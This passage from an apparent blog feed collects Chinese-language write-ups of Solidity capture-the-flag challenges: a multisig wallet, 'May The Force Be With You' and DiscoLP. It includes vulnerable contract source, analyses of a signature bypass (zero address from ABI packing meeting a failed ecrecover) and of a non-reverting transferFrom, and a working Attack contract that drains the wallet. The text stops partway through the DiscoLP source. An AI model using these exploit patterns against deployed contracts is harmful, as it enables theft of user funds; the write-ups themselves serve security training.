uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            require(</span><br><span class="line">                currentAllowance &gt;= amount,</span><br><span class="line">                &quot;ERC20: insufficient allowance&quot;</span><br><span class="line">            );</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Holder &#123;</span><br><span class="line">    address user;</span><br><span class="line">    string name;</span><br><span class="line">    bool approve;</span><br><span class="line">    bytes reason;</span><br><span class="line">&#125;</span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32[2] rs;</span><br><span class="line">&#125;</span><br><span class="line">struct SignedByowner &#123;</span><br><span class="line">    Holder holder;</span><br><span class="line">    Signature signature;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    address[] public owners;</span><br><span class="line">    address immutable public token;</span><br><span class="line">    Verifier immutable public verifier;</span><br><span class="line">    mapping(address =&gt; uint256) public contribution;</span><br><span class="line">    address[] public contributors;</span><br><span class="line">    address public debug;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        token = address(new NC());</span><br><span class="line">        verifier = new Verifier();</span><br><span class="line">        initWallet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initWallet() private &#123;</span><br><span class="line">        owners.push(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));</span><br><span class="line">        owners.push(address(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2));</span><br><span class="line">        owners.push(address(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db));</span><br><span class="line">        owners.push(address(0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB));</span><br><span class="line">        owners.push(address(0x617F2E2fD72FD9D5503197092aC168c91465E7f2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(uint256 _amount) public &#123;</span><br><span class="line">        require(_amount &gt; 0, &quot;Deposit value of 0 is not allowed&quot;);</span><br><span class="line">        IERC20(token).transferFrom(msg.sender, address(this), _amount);</span><br><span class="line">        if(contribution[msg.sender] == 0)&#123;</span><br><span class="line">            contributors.push(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">        contribution[msg.sender] += _amount;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferWithSign(address _to, uint256 _amount, SignedByowner[] calldata signs) external &#123;</span><br><span class="line">        require(address(0) != _to, &quot;Please fill in the correct address&quot;);</span><br><span class="line">        require(_amount &gt; 0, &quot;amount must be greater than 0&quot;);</span><br><span class="line">        uint256 len = signs.length;</span><br><span class="line">        require(len &gt; (owners.length / 2), &quot;Not enough signatures&quot;);</span><br><span class="line">        Holder memory holder;</span><br><span class="line">        uint256 numOfApprove;</span><br><span class="line">        for(uint i; i &lt; len; i++)&#123;</span><br><span class="line">            holder = signs[i].holder;</span><br><span class="line">            if(holder.approve)&#123;</span><br><span class="line">                //Prevent zero address</span><br><span class="line">                require(checkSinger(holder.user), &quot;Signer is not wallet owner&quot;);</span><br><span class="line">                verifier.verify(_to, _amount, signs[i]);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            numOfApprove++;</span><br><span class="line">        &#125;</span><br><span class="line">        require(numOfApprove &gt; owners.length / 2, &quot;not enough confirmation&quot;);</span><br><span class="line">        IERC20(token).approve(_to, _amount);</span><br><span class="line">        IERC20(token).transfer(_to, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function checkSinger(address _addr) public view returns(bool res)&#123;</span><br><span class="line">        for(uint i; i &lt; owners.length; i++)&#123;</span><br><span class="line">            if(owners[i] == _addr)&#123;</span><br><span class="line">                res = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns(bool)&#123;</span><br><span class="line">        return IERC20(token).balanceOf(address(this)) == 0;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Verifier&#123;</span><br><span class="line"></span><br><span class="line">    function verify(address _to, uint256 _amount, SignedByowner calldata scoupon) public pure&#123;</span><br><span class="line">        Holder memory holder = scoupon.holder;</span><br><span class="line">        Signature memory sig = scoupon.signature;</span><br><span class="line">        bytes memory serialized = abi.encode(</span><br><span class="line">            _to,</span><br><span class="line">            _amount,</span><br><span class="line">            holder.approve,</span><br><span class="line">            holder.reason</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        require(ecrecover(keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, serialized)), sig.v, sig.rs[0], sig.rs[1]) == holder.user, &quot;Invalid signature&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-7"><a href="#Analyse-7" class="headerlink" title="Analyse"></a>Analyse</h2><p>漏洞在于结构体中，如果中间的是一个不定长的字节，那么进行两次打包时，结构体的第一个将会变为0；0.8.16之前。也就是说打包的holder.user最后为0，且如果ecrecover恢复失败就会返回0，正好两者相等，就可以绕过签名，完成本题</p><h2 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    Wallet public wallet;</span><br><span class="line">    Holder public cp;</span><br><span class="line">    SignedByowner[] private signs;</span><br><span class="line">    constructor(address _wallet) &#123;</span><br><span class="line">        wallet = Wallet(_wallet);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        Holder memory h;</span><br><span class="line">        h.user = address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);</span><br><span class="line">        h.reason = bytes(&quot;hhhhhhhhhhhhh&quot;);</span><br><span class="line">        h.name = &quot;Tholas&quot;;</span><br><span class="line">        h.approve = true;</span><br><span class="line">        SignedByowner memory sign;</span><br><span class="line">        sign.holder = h;</span><br><span class="line"></span><br><span class="line">        Signature memory sig;</span><br><span class="line">        sig.v = 17;</span><br><span class="line">        sig.rs[1] = bytes32(0);</span><br><span class="line">        sig.rs[0] = bytes32(0);</span><br><span class="line"></span><br><span class="line">        sign.signature = sig;</span><br><span class="line"></span><br><span class="line">        signs.push(sign);</span><br><span class="line">        signs.push(sign);</span><br><span class="line">        signs.push(sign);</span><br><span class="line">        // caller(this).purchaseWithCoupon(signs);</span><br><span class="line">        wallet.transferWithSign(address(this), 100 * 10**18, signs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DeFi Hack</title>
      <link href="/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/DeFi%20Hack/"/>
      <url>/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/DeFi%20Hack/</url>
      
        <content type="html"><![CDATA[<h1 id="1-May-The-Force-Be-With-You"><a href="#1-May-The-Force-Be-With-You" class="headerlink" title="1.May The Force Be With You"></a>1.May The Force Be With You</h1><h2 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h2><p>A long time ago in a galaxy far, far away… a new DAO was created. Can you steal all the YODA tokens belonging to MayTheForceBeWithYou contract?</p><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/SafeERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract MayTheForceBeWithYou is ERC20, ReentrancyGuard &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    MiniMeToken public yoda;</span><br><span class="line"></span><br><span class="line">    event Withdraw(address indexed beneficiary, uint256 amount);</span><br><span class="line">    event Deposit(address indexed beneficiary, uint256 amount);</span><br><span class="line"></span><br><span class="line">    // Define the Yoda token contract</span><br><span class="line">    constructor(address _underlying) ERC20(&quot;xYODA&quot;, &quot;xYODA&quot;) public &#123;</span><br><span class="line">        yoda = MiniMeToken(_underlying);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(uint256 amount) external nonReentrant &#123;</span><br><span class="line">        // Gets the amount of YODA locked in the contract</span><br><span class="line">        uint256 totalYoda = yoda.balanceOf(address(this));</span><br><span class="line">        // Gets the amount of xYODA in existence</span><br><span class="line">        uint256 totalShares = totalSupply();</span><br><span class="line">        // If no xYODA exists, mint it 1:1 to the amount put in</span><br><span class="line">        if (totalShares == 0 || totalYoda == 0) &#123;</span><br><span class="line">            _mint(msg.sender, amount);</span><br><span class="line">        &#125;</span><br><span class="line">        // Calculate and mint the amount of xYODA the YODA is worth. The ratio will change overtime, as xYODA is burned/minted and YODA deposited + gained from fees / withdrawn.</span><br><span class="line">        else &#123;</span><br><span class="line">            uint256 what = amount.mul(totalShares).div(totalYoda);</span><br><span class="line">            _mint(msg.sender, what);</span><br><span class="line">        &#125;</span><br><span class="line">        // Lock the YODA in the contract</span><br><span class="line">        yoda.transferFrom(msg.sender, address(this), amount);</span><br><span class="line"></span><br><span class="line">        emit Deposit(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 numberOfShares) external nonReentrant &#123;</span><br><span class="line">        // Gets the amount of xYODA in existence</span><br><span class="line">        uint256 totalShares = totalSupply();</span><br><span class="line">        // Calculates the amount of YODA the xYODA is worth</span><br><span class="line">        uint256 what =</span><br><span class="line">            numberOfShares.mul(yoda.balanceOf(address(this))).div(totalShares);</span><br><span class="line">        _burn(msg.sender, numberOfShares);</span><br><span class="line">        yoda.transfer(msg.sender, what);</span><br><span class="line"></span><br><span class="line">        emit Withdraw(msg.sender, what);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MiniMeToken is Ownable &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    string public name;</span><br><span class="line">    uint8 public decimals;</span><br><span class="line">    string public symbol;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint256) balances;</span><br><span class="line">    mapping (address =&gt; mapping (address =&gt; uint256)) allowed;</span><br><span class="line">    uint256 totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        string memory _tokenName,</span><br><span class="line">        uint8 _decimalUnits,</span><br><span class="line">        string memory _tokenSymbol</span><br><span class="line">    )  public</span><br><span class="line">    &#123;</span><br><span class="line">        name = _tokenName;                                 // Set the name</span><br><span class="line">        decimals = _decimalUnits;                          // Set the decimals</span><br><span class="line">        symbol = _tokenSymbol;                             // Set the symbol</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _amount) public returns (bool success) &#123;</span><br><span class="line">        return doTransfer(msg.sender, _to, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) &#123;</span><br><span class="line">        if (allowed[_from][msg.sender] &lt; _amount)</span><br><span class="line">            return false;</span><br><span class="line">        allowed[_from][msg.sender] -= _amount;</span><br><span class="line">        return doTransfer(_from, _to, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function doTransfer(address _from, address _to, uint _amount) internal returns(bool) &#123;</span><br><span class="line">        if (_amount == 0) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        // Do not allow transfer to 0x0 or the token contract itself</span><br><span class="line">        require((_to != address(0)) &amp;&amp; (_to != address(this)));</span><br><span class="line">        // If the amount being transfered is more than the balance of the</span><br><span class="line">        //  account the transfer returns false</span><br><span class="line">        if (balances[_from] &lt; _amount) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // First update the balance array with the new value for the address</span><br><span class="line">        //  sending the tokens</span><br><span class="line">        balances[_from] = balances[_from] - _amount;</span><br><span class="line">        // Then update the balance array with the new value for the address</span><br><span class="line">        //  receiving the tokens</span><br><span class="line"></span><br><span class="line">        require(balances[_to] + _amount &gt;= balances[_to]); // Check for overflow</span><br><span class="line">        balances[_to] = balances[_to] + _amount;</span><br><span class="line">        // An event to make the transfer easy to find on the blockchain</span><br><span class="line">        Transfer(_from, _to, _amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function approve(address _spender, uint256 _amount) public returns (bool success) &#123;</span><br><span class="line">        require((_amount == 0) || (allowed[msg.sender][_spender] == 0));</span><br><span class="line"></span><br><span class="line">        allowed[msg.sender][_spender] = _amount;</span><br><span class="line">        Approval(msg.sender, _spender, _amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address _owner, address _spender) public view returns (uint256 remaining) &#123;</span><br><span class="line">        return allowed[_owner][_spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">      return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address _owner, uint256 _amount) public onlyOwner &#123;</span><br><span class="line">      balances[_owner] = _amount;</span><br><span class="line">      totalSupply += _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed _from, address indexed _to, uint256 _amount);</span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed _owner,</span><br><span class="line">        address indexed _spender,</span><br><span class="line">        uint256 _amount</span><br><span class="line">      );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h2><p>这一题的主要漏洞在于transferFrom</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) &#123;</span><br><span class="line">    if (allowed[_from][msg.sender] &lt; _amount)</span><br><span class="line">        return false;</span><br><span class="line">    allowed[_from][msg.sender] -= _amount;</span><br><span class="line">    return doTransfer(_from, _to, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>transferFrom不会回退只会return false,因此在deposit中，无需转账就可以铸造代币了</p><h1 id="2-DiscoLP"><a href="#2-DiscoLP" class="headerlink" title="2.DiscoLP"></a>2.DiscoLP</h1><h2 id="Request-1"><a href="#Request-1" class="headerlink" title="Request"></a>Request</h2><p>DiscoLP is a brand new liquidity mining protocol! You can participate by depositing some JIMBO or JAMBO tokens. All liquidity will be supplied to JIMBO-JAMBO Uniswap pair. By providing liquidity with us you will get DISCO tokens in return!</p><p>You have 1 JIMBO and 1 JAMBO, can you get at least 100 DISCO tokens?</p><h2 id="Source-Code-1"><a href="#Source-Code-1" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.6.5;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/SafeERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line">import &quot;./Babylonian.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DiscoLP is ERC20, Ownable, ReentrancyGuard</span><br><span class="line">&#123;</span><br><span class="line">  using SafeERC20 for IERC20;</span><br><span class="line"></span><br><span class="line">  address public immutable reserveToken;</span><br><span class="line"></span><br><span class="line">  constructor (string memory _name, string memory _symbol, uint8 _decimals, address _reserveToken)</span><br><span class="line">    ERC20(_name, _symbol) public</span><br><span class="line">  &#123;</span><br><span class="line">    _setupDecimals(_decimals);</span><br><span class="line">    assert(_reserveToken != address(0));</span><br><span class="line">    reserveToken = _reserveToken;</span><br><span class="line">    _mint(address(this), 100000 * 10 ** 18); // some inital supply</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function calcCostFromShares(uint256 _shares) public view returns (uint256 _cost)</span><br><span class="line">  &#123;</span><br><span class="line">    return _shares.mul(totalReserve()).div(totalSupply());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function totalReserve() public view returns (uint256 _totalReserve)</span><br><span class="line">  &#123;</span><br><span class="line">    return IERC20(reserveToken).balanceOf(address(this));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // accepts only JIMBO or JAMBO tokens</span><br><span class="line">  function depositToken(address _token, uint256 _amount, uint256 _minShares) external nonReentrant</span><br><span class="line">  &#123;</span><br><span class="line">    address _from = msg.sender;</span><br><span class="line">    uint256 _minCost = calcCostFromShares(_minShares);</span><br><span class="line">    if (_amount != 0) &#123;</span><br><span class="line">      IERC20(_token).safeTransferFrom(_from, address(this), _amount);</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 _cost = UniswapV2LiquidityPoolAbstraction._joinPool(reserveToken, _token, _amount, _minCost);</span><br><span class="line">    uint256 _shares = _cost.mul(totalSupply()).div(totalReserve().sub(_cost));</span><br><span class="line">    _mint(_from, _shares);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library UniswapV2LiquidityPoolAbstraction</span><br><span class="line">&#123;</span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  using SafeERC20 for IERC20;</span><br><span class="line"></span><br><span class="line">  function _joinPool(address _pair, address _token, uint256 _amount, uint256 _minShares) internal returns (uint256 _shares)</span><br><span class="line">  &#123;</span><br><span class="line">    if (_amount == 0) return 0;</span><br><span class="line">    address _router = $.UniswapV2_ROUTER02;</span><br><span class="line">    address _token0 = Pair(_pair).token0();</span><br><span class="line">    address _token1 = Pair(_pair).token1();</span><br><span class="line">    address _otherToken = _token == _token0 ? _token1 : _token0;</span><br><span class="line">    (uint256 _reserve0, uint256 _reserve1,) = Pair(_pair).getReserves();</span><br><span class="line">    uint256 _swapAmount = _calcSwapOutputFromInput(_token == _token0 ? _reserve0 : _reserve1, _amount);</span><br><span class="line">    if (_swapAmount == 0) _swapAmount = _amount / 2;</span><br><span class="line">    uint256 _leftAmount = _amount.sub(_swapAmount);</span><br><span class="line">    _approveFunds(_token, _router, _amount);</span><br><span class="line">    address[] memory _path = new address[](2);</span><br><span class="line">    _path[0] = _token;</span><br><span class="line">    _path[1] = _otherToken;</span><br><span class="line">    uint256 _otherAmount = Router02(_router).swapExactTokensForTokens(_swapAmount, 1, _path, address(this), uint256(-1))[1];</span><br><span class="line">    _approveFunds(_otherToken, _router, _otherAmount);</span><br><span class="line">    (,,_shares) = Router02(_router).addLiquidity(_token, _otherToken, _leftAmount, _otherAmount, 1, 1, address(this), uint256(-1));</span><br><span class="line">    require(_shares &gt;= _minShares, &quot;high slippage&quot;);</span><br><span class="line">    return _shares;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _calcSwapOutputFromInput(uint256 _reserveAmount, uint256 _inputAmount) private pure returns (uint256)</span><br><span class="line">  &#123;</span><br><span class="line">    return Babylonian.sqrt(_reserveAmount.mul(_inputAmount.mul(3988000).add(_reserveAmount.mul(3988009)))).sub(_reserveAmount.mul(1997)) / 1994;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _approveFunds(address _token, address _to, uint256 _amount) internal</span><br><span class="line">  &#123;</span><br><span class="line">    uint256 _allowance = IERC20(_token).allowance(address(this), _to);</span><br><span class="line">    if (_allowance &gt; _amount) &#123;</span><br><span class="line">      IERC20(_token).safeDecreaseAllowance(_to, _allowance - _amount);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    if (_allowance &lt; _amount) &#123;</span><br><span class="line">      IERC20(_token).safeIncreaseAllowance(_to, _amount - _allowance);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library $</span><br><span class="line">&#123;</span><br><span class="line">  address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten</span><br><span class="line">  address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Router01</span><br><span class="line">&#123;</span><br><span class="line">  function WETH() external pure returns (address _token);</span><br><span class="line">  function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);</span><br><span class="line">  function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);</span><br><span class="line">  function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);</span><br><span class="line">  function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);</span><br><span class="line">  function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Router02 is Router01</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface PoolToken is IERC20</span><br><span class="line">&#123;</span><br><span 